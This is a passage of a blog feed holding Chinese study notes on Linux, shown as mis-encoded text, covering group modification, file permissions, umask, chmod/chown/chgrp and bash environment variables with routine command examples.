</p><hr><h4 id="7-2-3-ä¿®æ”¹ç»„"><a href="#7-2-3-ä¿®æ”¹ç»„" class="headerlink" title="7.2.3 ä¿®æ”¹ç»„"></a>7.2.3 ä¿®æ”¹ç»„</h4><p><code>groupmod</code>å‘½ä»¤å¯ä»¥ä¿®æ”¹å·²æœ‰ç»„çš„GIDï¼ˆåŠ <code>-g</code>é€‰é¡¹ï¼‰æˆ–ç»„åï¼ˆåŠ <code>-n</code>é€‰é¡¹ï¼‰ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/groupmod -n sharing shared</span><span class="token comment"># tail /etc/group</span>haldaemon:x:68:7.3 xfs:x:43:gdm:x:42:rich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:sharing:x:505:test,rich<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-3-ç†è§£æ–‡ä»¶æƒé™"><a href="#7-3-ç†è§£æ–‡ä»¶æƒé™" class="headerlink" title="7.3 ç†è§£æ–‡ä»¶æƒé™"></a>7.3 ç†è§£æ–‡ä»¶æƒé™</h3><h4 id="7-3-1-ä½¿ç”¨æ–‡ä»¶æƒé™ç¬¦"><a href="#7-3-1-ä½¿ç”¨æ–‡ä»¶æƒé™ç¬¦" class="headerlink" title="7.3.1 ä½¿ç”¨æ–‡ä»¶æƒé™ç¬¦"></a>7.3.1 ä½¿ç”¨æ–‡ä»¶æƒé™ç¬¦</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">myh@VM-16-11-debian:/tmp/test$ <span class="token function">ls</span> -alFtotal <span class="token number">36</span>drwxr-xr-x <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 ./drwxrwxrwt <span class="token number">9</span> root root <span class="token number">20480</span> Feb  <span class="token number">8</span> 06:43 <span class="token punctuation">..</span>/-rw-r--r-- <span class="token number">1</span> root root     <span class="token number">0</span> Jan <span class="token number">25</span> <span class="token number">14</span>:28 cho-rw-r--r-- <span class="token number">1</span> root root    <span class="token number">22</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 makefile-rw-r--r-- <span class="token number">1</span> root root    <span class="token number">68</span> Jan <span class="token number">23</span> <span class="token number">20</span>:14 test1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºç»“æœçš„ç¬¬ä¸€ä¸ªå­—æ®µå°±æ˜¯æè¿°æ–‡ä»¶å’Œç›®å½•æƒé™çš„ç¼–ç ã€‚è¿™ä¸ªå­—æ®µçš„<font color="#FF5E3A" size="3">ç¬¬ä¸€ä¸ªå­—ç¬¦ä»£è¡¨äº†å¯¹è±¡çš„ç±»å‹</font>ï¼š  </p><ul><li><code> -</code>ä»£è¡¨æ–‡ä»¶</li><li><code> d</code>ä»£è¡¨ç›®å½•</li><li><code> l</code>ä»£è¡¨é“¾æ¥</li><li><code> c</code>ä»£è¡¨å­—ç¬¦å‹è®¾å¤‡</li><li><code> b</code>ä»£è¡¨å—è®¾å¤‡</li><li><code> n</code>ä»£è¡¨ç½‘ç»œè®¾å¤‡  </li></ul><p>ä¹‹åæœ‰3ç»„ä¸‰å­—ç¬¦çš„ç¼–ç ã€‚æ¯ä¸€ç»„å®šä¹‰äº†3ç§è®¿é—®æƒé™ï¼š  </p><ul><li><code> r</code>ä»£è¡¨å¯¹è±¡æ˜¯å¯è¯»çš„</li><li><code> w</code>ä»£è¡¨å¯¹è±¡æ˜¯å¯å†™çš„</li><li><code> x</code>ä»£è¡¨å¯¹è±¡æ˜¯å¯æ‰§è¡Œçš„    </li></ul><p><font color="#FF5E3A" size="3">è‹¥æ²¡æœ‰æŸç§æƒé™ï¼Œåœ¨è¯¥æƒé™ä½ä¼šå‡ºç°å•ç ´æŠ˜çº¿</font>ã€‚  è¿™3ç»„æƒé™åˆ†åˆ«å¯¹åº”å¯¹è±¡çš„3ä¸ªå®‰å…¨çº§åˆ«ï¼š  </p><ul><li> å¯¹è±¡çš„å±ä¸»</li><li> å¯¹è±¡çš„å±ç»„</li><li> ç³»ç»Ÿå…¶ä»–ç”¨æˆ·  </li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux7/202202082034798.png"></p><p>å¯¹åº”å¦‚ä¸‹ï¼š</p><ul><li> rwxï¼šæ–‡ä»¶çš„å±ä¸»ï¼ˆè®¾ä¸ºç™»å½•årichï¼‰</li><li> rwxï¼šæ–‡ä»¶çš„å±ç»„ï¼ˆè®¾ä¸ºç»„årichï¼‰</li><li> r-xï¼šç³»ç»Ÿä¸Šå…¶ä»–äººã€‚  </li></ul><p>è¯´æ˜ç™»å½•åä¸ºrichçš„ç”¨æˆ·å¯ä»¥è¯»å–ã€å†™å…¥ä»¥åŠæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼ˆå¯ä»¥çœ‹ä½œæœ‰å…¨éƒ¨æƒé™ï¼‰ã€‚ç±»ä¼¼åœ°ï¼Œ richç»„çš„æˆå‘˜ä¹Ÿå¯ä»¥è¯»å–ã€å†™å…¥å’Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚ç„¶è€Œä¸å±äºrichç»„çš„å…¶ä»–ç”¨æˆ·åªèƒ½è¯»å–å’Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼š wè¢«å•ç ´æŠ˜çº¿å–ä»£äº†ï¼Œè¯´æ˜è¿™ä¸ªå®‰å…¨çº§åˆ«æ²¡æœ‰å†™å…¥æƒé™ã€‚  </p><h4 id="7-3-2-é»˜è®¤æ–‡ä»¶æƒé™"><a href="#7-3-2-é»˜è®¤æ–‡ä»¶æƒé™" class="headerlink" title="7.3.2 é»˜è®¤æ–‡ä»¶æƒé™"></a>7.3.2 é»˜è®¤æ–‡ä»¶æƒé™</h4><p><code>umask</code>å‘½ä»¤ç”¨æ¥è®¾ç½®æ‰€åˆ›å»ºæ–‡ä»¶å’Œç›®å½•çš„é»˜è®¤æƒé™ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">touch</span> newfile$ <span class="token function">ls</span> -al newfile-rw-r--r-- <span class="token number">1</span> rich rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>touch</code>å‘½ä»¤ç”¨åˆ†é…ç»™çš„ç”¨æˆ·è´¦æˆ·çš„é»˜è®¤æƒé™åˆ›å»ºäº†è¿™ä¸ªæ–‡ä»¶ã€‚<code> umask</code>å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå’Œè®¾ç½®è¿™ä¸ªé»˜è®¤æƒé™ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">umask</span>0022$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€ä½ä»£è¡¨äº†ä¸€é¡¹ç‰¹åˆ«çš„å®‰å…¨ç‰¹æ€§ï¼Œå«ä½œç²˜ç€ä½ï¼ˆ sticky bitï¼‰ã€‚è¿™éƒ¨åˆ†å†…å®¹ä¼šåœ¨7.5èŠ‚è¯¦è¿°ã€‚  </p><p>åé¢çš„3ä½è¡¨ç¤ºæ–‡ä»¶æˆ–ç›®å½•å¯¹åº”çš„<code>umask</code>å…«è¿›åˆ¶å€¼ã€‚è¦ç†è§£<code>umask</code>æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œå¾—å…ˆç†è§£<font color="#FF5E3A" size="3">å…«è¿›åˆ¶æ¨¡å¼çš„å®‰å…¨æ€§è®¾ç½®</font>ã€‚  </p><p>å…«è¿›åˆ¶æ¨¡å¼çš„å®‰å…¨æ€§è®¾ç½®å…ˆè·å–è¿™3ä¸ªrwxæƒé™çš„å€¼ï¼Œç„¶åå°†å…¶è½¬æ¢æˆ3ä½äºŒè¿›åˆ¶å€¼ï¼Œç”¨ä¸€ä¸ªå…«è¿›åˆ¶å€¼æ¥è¡¨ç¤ºã€‚åœ¨è¿™ä¸ªäºŒè¿›åˆ¶è¡¨ç¤ºä¸­ï¼Œæ¯ä¸ªä½ç½®ä»£è¡¨ä¸€ä¸ªäºŒè¿›åˆ¶ä½ã€‚å› æ­¤ï¼Œå¦‚æœè¯»æƒé™æ˜¯å”¯ä¸€ç½®ä½çš„æƒé™ï¼Œæƒé™å€¼å°±æ˜¯râ€“ï¼Œè½¬æ¢æˆäºŒè¿›åˆ¶å€¼å°±æ˜¯100ï¼Œä»£è¡¨çš„å…«è¿›åˆ¶å€¼æ˜¯4ã€‚ </p><p>Linuxç³»ç»Ÿä¸Šé»˜è®¤çš„å…«è¿›åˆ¶çš„<code>umask</code>å€¼æ˜¯0022ï¼Œè€Œæˆ‘æ‰€åˆ›å»ºçš„æ–‡ä»¶çš„å…«è¿›åˆ¶æƒé™å´æ˜¯644ï¼Œè¿™æ˜¯å¦‚ä½•å¾—æ¥çš„å‘¢ï¼Ÿ </p><p><font color="red" size="3"><code>umask</code>å€¼åªæ˜¯ä¸ªæ©ç ï¼Œå®ƒä¼šå±è”½æ‰ä¸æƒ³æˆäºˆè¯¥å®‰å…¨çº§åˆ«çš„æƒé™ã€‚</font>è¦æŠŠ<code>umask</code>å€¼ä»<font color="#FF5E3A" size="3">å¯¹è±¡çš„å…¨æƒé™å€¼</font>ä¸­å‡æ‰ã€‚æ–‡ä»¶çš„å…¨æƒé™çš„å€¼æ˜¯666ï¼ˆæ‰€æœ‰ç”¨æˆ·éƒ½æœ‰è¯»å’Œå†™çš„æƒé™ï¼‰ï¼›ç›®å½•çš„åˆ™æ˜¯777ï¼ˆæ‰€æœ‰ç”¨æˆ·éƒ½æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼‰ã€‚   </p><p>åœ¨ä¸Šä¾‹ä¸­ï¼Œæ–‡ä»¶ä¸€å¼€å§‹çš„æƒé™æ˜¯666ï¼Œ å‡å»<code>umask</code>å€¼022ä¹‹åï¼Œ å‰©ä¸‹çš„æ–‡ä»¶æƒé™å°±æˆäº†644ã€‚ </p><p>å¯ä»¥ç”¨<code>umask</code>å‘½ä»¤ä¸ºé»˜è®¤<code>umask</code>è®¾ç½®æŒ‡å®šä¸€ä¸ªæ–°å€¼ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">umask</span> 026$ <span class="token function">touch</span> newfile2$ <span class="token function">ls</span> -l newfile2-rw-r----- <span class="token number">1</span> rich rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:46 newfile2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹      </p><h3 id="7-4-æ”¹å˜å®‰å…¨æ€§è®¾ç½®"><a href="#7-4-æ”¹å˜å®‰å…¨æ€§è®¾ç½®" class="headerlink" title="7.4 æ”¹å˜å®‰å…¨æ€§è®¾ç½®"></a>7.4 æ”¹å˜å®‰å…¨æ€§è®¾ç½®</h3><p>å¦‚æœå·²ç»åˆ›å»ºäº†ä¸€ä¸ªç›®å½•æˆ–æ–‡ä»¶ï¼Œéœ€è¦æ”¹å˜å®ƒçš„å®‰å…¨æ€§è®¾ç½®ï¼Œåœ¨Linuxç³»ç»Ÿä¸Šæœ‰ä¸€äº›å·¥å…·èƒ½å¤Ÿå®Œæˆè¿™é¡¹ä»»åŠ¡ã€‚</p><h4 id="7-4-1-æ”¹å˜æƒé™"><a href="#7-4-1-æ”¹å˜æƒé™" class="headerlink" title="7.4.1 æ”¹å˜æƒé™"></a>7.4.1 æ”¹å˜æƒé™</h4><p><code>chmod</code>å‘½ä»¤ç”¨æ¥æ”¹å˜æ–‡ä»¶å’Œç›®å½•çš„å®‰å…¨æ€§è®¾ç½®ã€‚ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> options mode <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> modeå‚æ•°å¯ä»¥ä½¿ç”¨å…«è¿›åˆ¶æ¨¡å¼æˆ–ç¬¦å·æ¨¡å¼è¿›è¡Œå®‰å…¨æ€§è®¾ç½®ã€‚ ä¸€èˆ¬ç”¨å…«è¿›åˆ¶æ¨¡å¼å°±å¯ä»¥äº†ã€‚ </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> <span class="token number">760</span> newfile$ <span class="token function">ls</span> -l newfile-rwxrw---- <span class="token number">1</span> rich rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>options</code>ä¸º<code>chmod</code>å‘½ä»¤æä¾›äº†å¦å¤–ä¸€äº›åŠŸèƒ½ã€‚ -Ré€‰é¡¹å¯ä»¥è®©æƒé™çš„æ”¹å˜é€’å½’åœ°ä½œç”¨åˆ°æ–‡ä»¶å’Œå­ç›®å½•ã€‚  </p><h4 id="7-4-2-æ”¹å˜æ‰€å±å…³ç³»"><a href="#7-4-2-æ”¹å˜æ‰€å±å…³ç³»" class="headerlink" title="7.4.2 æ”¹å˜æ‰€å±å…³ç³»"></a>7.4.2 æ”¹å˜æ‰€å±å…³ç³»</h4><p><code>chown</code>å‘½ä»¤ç”¨æ¥æ”¹å˜æ–‡ä»¶çš„å±ä¸»ï¼Œ<code>chgr</code>på‘½ä»¤ç”¨æ¥æ”¹å˜æ–‡ä»¶çš„é»˜è®¤å±ç»„ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> options owner<span class="token punctuation">[</span>.group<span class="token punctuation">]</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ç”¨ç™»å½•åæˆ–UIDæ¥æŒ‡å®šæ–‡ä»¶çš„æ–°å±ä¸»ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># chown dan newfile</span><span class="token comment"># ls -l newfile</span>-rw-rw-r-- <span class="token number">1</span> dan rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <code> chown</code>å‘½ä»¤ä¹Ÿæ”¯æŒåŒæ—¶æ”¹å˜æ–‡ä»¶çš„å±ä¸»å’Œå±ç»„ ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># chown dan.shared newfile</span><span class="token comment"># ls -l newfile</span>-rw-rw-r-- <span class="token number">1</span> dan shared <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœLinuxç³»ç»Ÿé‡‡ç”¨å’Œç”¨æˆ·ç™»å½•ååŒ¹é…çš„ç»„åï¼Œå¯ä»¥åªç”¨ä¸€ä¸ªæ¡ç›®å°±æ”¹å˜äºŒè€…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># chown test. newfile</span><span class="token comment"># ls -l newfile</span>-rw-rw-r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>chown</code>å‘½ä»¤é‡‡ç”¨ä¸€äº›ä¸åŒçš„é€‰é¡¹å‚æ•°ã€‚<code> -R</code>é€‰é¡¹é…åˆé€šé…ç¬¦å¯ä»¥é€’å½’åœ°æ”¹å˜å­ç›®å½•å’Œæ–‡ä»¶çš„æ‰€å±å…³ç³»ã€‚<code> -h</code>é€‰é¡¹å¯ä»¥æ”¹å˜è¯¥æ–‡ä»¶çš„æ‰€æœ‰ç¬¦å·é“¾æ¥æ–‡ä»¶çš„æ‰€å±å…³ç³»ã€‚  </p><hr><p><strong>è¯´æ˜</strong> åªæœ‰rootç”¨æˆ·èƒ½å¤Ÿæ”¹å˜æ–‡ä»¶çš„å±ä¸»ã€‚ä»»ä½•å±ä¸»éƒ½å¯ä»¥æ”¹å˜æ–‡ä»¶çš„å±ç»„ï¼Œä½†å‰ææ˜¯å±ä¸»å¿…é¡»<br>æ˜¯åŸå±ç»„å’Œç›®æ ‡å±ç»„çš„æˆå‘˜ã€‚  </p><hr><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chgrp</span> shared newfile$ <span class="token function">ls</span> -l newfile-rw-rw-r-- <span class="token number">1</span> rich shared <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç”¨æˆ·è´¦æˆ·å¿…é¡»æ˜¯è¿™ä¸ªæ–‡ä»¶çš„å±ä¸»ï¼Œé™¤äº†èƒ½å¤Ÿæ›´æ¢å±ç»„ä¹‹å¤–ï¼Œè¿˜å¾—æ˜¯æ–°ç»„çš„æˆå‘˜ã€‚  </p><hr><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux7/202202062048582.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linuxå­¦ä¹ -ç¬¬å…­ç« </title>
    <link href="https://huhu-myh.github.io/posts/myh10013.html"/>
    <id>https://huhu-myh.github.io/posts/myh10013.html</id>
    <published>2022-02-04T08:54:45.000Z</published>
    <updated>2022-02-06T11:56:02.381Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç¬¬å…­ç« ï¼šä½¿ç”¨Linuxç¯å¢ƒå˜é‡"><a href="#ç¬¬å…­ç« ï¼šä½¿ç”¨Linuxç¯å¢ƒå˜é‡" class="headerlink" title="ç¬¬å…­ç« ï¼šä½¿ç”¨Linuxç¯å¢ƒå˜é‡"></a>ç¬¬å…­ç« ï¼šä½¿ç”¨Linuxç¯å¢ƒå˜é‡</h2><h3 id="6-1-ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡"><a href="#6-1-ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡" class="headerlink" title="6.1 ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡"></a>6.1 ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡</h3><p>bash shellç”¨ä¸€ä¸ªå«ä½œç¯å¢ƒå˜é‡ï¼ˆ environment variableï¼‰çš„ç‰¹æ€§æ¥<font color="#FF5E3A" size="3">å­˜å‚¨æœ‰å…³shellä¼šè¯å’Œå·¥ä½œç¯å¢ƒçš„ä¿¡æ¯</font>ï¼ˆè¿™ä¹Ÿæ˜¯å®ƒä»¬è¢«ç§°ä½œç¯å¢ƒå˜é‡çš„åŸå› ï¼‰ã€‚è¿™é¡¹ç‰¹æ€§å…è®¸ä½ åœ¨å†…å­˜ä¸­å­˜å‚¨æ•°æ®ï¼Œä»¥ä¾¿ç¨‹åºæˆ–shellä¸­è¿è¡Œçš„è„šæœ¬èƒ½å¤Ÿè½»æ¾è®¿é—®åˆ°å®ƒä»¬ã€‚è¿™ä¹Ÿæ˜¯å­˜å‚¨æŒä¹…æ•°æ®çš„ä¸€ç§ç®€ä¾¿æ–¹æ³•ã€‚åœ¨bash shellä¸­ï¼Œç¯å¢ƒå˜é‡åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>å…¨å±€å˜é‡</li><li>å±€éƒ¨å˜é‡  </li></ul><h4 id="6-1-1-å…¨å±€ç¯å¢ƒå˜é‡"><a href="#6-1-1-å…¨å±€ç¯å¢ƒå˜é‡" class="headerlink" title="6.1.1 å…¨å±€ç¯å¢ƒå˜é‡"></a>6.1.1 å…¨å±€ç¯å¢ƒå˜é‡</h4><p>å…¨å±€ç¯å¢ƒå˜é‡å¯¹äº<font color="#FF5E3A" size="3">shellä¼šè¯å’Œæ‰€æœ‰ç”Ÿæˆçš„å­shell</font>éƒ½æ˜¯å¯è§çš„ã€‚å±€éƒ¨å˜é‡åˆ™<font color="#FF5E3A" size="3">åªå¯¹åˆ›å»ºå®ƒä»¬çš„shell</font>å¯è§ã€‚å…¨å±€ç¯å¢ƒå˜é‡å¯¹é‚£äº›æ‰€åˆ›å»ºçš„å­shelléœ€è¦è·å–çˆ¶shellä¿¡æ¯çš„ç¨‹åºæ¥è¯´éå¸¸æœ‰ç”¨ã€‚  ç³»ç»Ÿç¯å¢ƒå˜é‡åŸºæœ¬ä¸Šéƒ½æ˜¯ä½¿ç”¨å…¨å¤§å†™å­—æ¯ï¼Œä»¥åŒºåˆ«äºæ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚  </p><p>æŸ¥çœ‹å…¨å±€å˜é‡ï¼Œå¯ä»¥ä½¿ç”¨<code>env</code>æˆ–<code>printenv</code>å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/<span class="token comment"># printenv</span><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/bash<span class="token assign-left variable"><span class="token environment constant">HISTSIZE</span></span><span class="token operator">=</span><span class="token number">3000</span><span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>en_US.utf8<span class="token assign-left variable">JRE_HOME</span><span class="token operator">=</span>/usr/local/java/jdk-16.0.1+9/jre<span class="token assign-left variable">HISTTIMEFORMAT</span><span class="token operator">=</span>%F %T <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/<span class="token assign-left variable"><span class="token environment constant">LOGNAME</span></span><span class="token operator">=</span>root<span class="token assign-left variable"><span class="token environment constant">XDG_SESSION_TYPE</span></span><span class="token operator">=</span>tty<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> è¦<strong>æ˜¾ç¤ºä¸ªåˆ«ç¯å¢ƒå˜é‡</strong>çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨<code>printenv</code>å‘½ä»¤ï¼Œä½†æ˜¯ä¸è¦ç”¨<code>env</code>å‘½ä»¤:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">printenv</span> <span class="token environment constant">HOME</span>/home/Christine$$ <span class="token function">env</span> <span class="token environment constant">HOME</span>env: <span class="token environment constant">HOME</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨echoæ˜¾ç¤ºå˜é‡çš„å€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹å¼•ç”¨æŸä¸ªç¯å¢ƒå˜é‡çš„æ—¶å€™ï¼Œå¿…é¡»åœ¨<font color="#FF5E3A" size="3">å˜é‡å‰é¢åŠ ä¸Šä¸€ä¸ªç¾å…ƒç¬¦ï¼ˆ $ï¼‰</font>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/<span class="token comment"># echo $HOME</span>/root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨echoå‘½ä»¤ä¸­ï¼Œåœ¨å˜é‡åå‰åŠ ä¸Š$å¯ä¸ä»…ä»…æ˜¯è¦æ˜¾ç¤ºå˜é‡å½“å‰çš„å€¼ã€‚å®ƒèƒ½å¤Ÿ<font color="#FF5E3A" size="3">è®©å˜é‡ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°</font>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/<span class="token comment"># ls $HOME</span>disk.sh  install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-1-2-å±€éƒ¨ç¯å¢ƒå˜é‡"><a href="#6-1-2-å±€éƒ¨ç¯å¢ƒå˜é‡" class="headerlink" title="6.1.2 å±€éƒ¨ç¯å¢ƒå˜é‡"></a>6.1.2 å±€éƒ¨ç¯å¢ƒå˜é‡</h4><p>å±€éƒ¨ç¯å¢ƒå˜é‡åªèƒ½åœ¨å®šä¹‰å®ƒä»¬çš„è¿›ç¨‹ä¸­å¯è§ã€‚äº‹å®ä¸Šï¼Œ Linuxç³»ç»Ÿä¹Ÿé»˜è®¤å®šä¹‰äº†æ ‡å‡†çš„å±€éƒ¨ç¯å¢ƒå˜é‡ã€‚ä¹Ÿå¯ä»¥å®šä¹‰è‡ªå·±çš„å±€éƒ¨å˜é‡ï¼Œè¿™äº›å˜é‡è¢«ç§°ä¸ºç”¨æˆ·å®šä¹‰å±€éƒ¨å˜é‡ã€‚  </p><p>åœ¨Linuxç³»ç»Ÿå¹¶æ²¡æœ‰ä¸€ä¸ªåªæ˜¾ç¤ºå±€éƒ¨ç¯å¢ƒå˜é‡çš„å‘½ä»¤ã€‚<code> set</code>å‘½ä»¤ä¼šæ˜¾ç¤ºä¸ºæŸä¸ªç‰¹å®šè¿›ç¨‹è®¾ç½®çš„<strong>æ‰€æœ‰ç¯å¢ƒå˜é‡</strong>ï¼ŒåŒ…æ‹¬<strong>å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚</strong>  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">set</span><span class="token assign-left variable"><span class="token environment constant">BASH</span></span><span class="token operator">=</span>/bin/bash<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token assign-left variable"><span class="token environment constant">BASH_ALIASES</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_ARGC</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_ARGV</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_CMDS</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_LINENO</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_SOURCE</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token assign-left variable">colors</span><span class="token operator">=</span>/etc/DIR_COLORS<span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">'Hello World'</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡<code>printenv</code>å‘½ä»¤èƒ½çœ‹åˆ°çš„å…¨å±€ç¯å¢ƒå˜é‡éƒ½å‡ºç°åœ¨äº†<code>set</code>å‘½ä»¤çš„è¾“å‡ºä¸­ã€‚ä½†åœ¨<code>set</code>å‘½ä»¤çš„è¾“å‡ºä¸­<strong>è¿˜æœ‰å…¶ä»–ä¸€äº›ç¯å¢ƒå˜é‡</strong>ï¼Œå³å±€éƒ¨ç¯å¢ƒå˜é‡å’Œç”¨æˆ·å®šä¹‰å˜é‡ã€‚  </p><hr><p><strong>è¯´æ˜</strong>  å‘½ä»¤envã€ printenvå’Œsetä¹‹é—´çš„å·®å¼‚å¾ˆç»†å¾®ã€‚ setå‘½ä»¤ä¼šæ˜¾ç¤ºå‡ºå…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚å®ƒè¿˜ä¼šæŒ‰ç…§å­—æ¯é¡ºåºå¯¹ç»“æœè¿›è¡Œæ’åºã€‚ 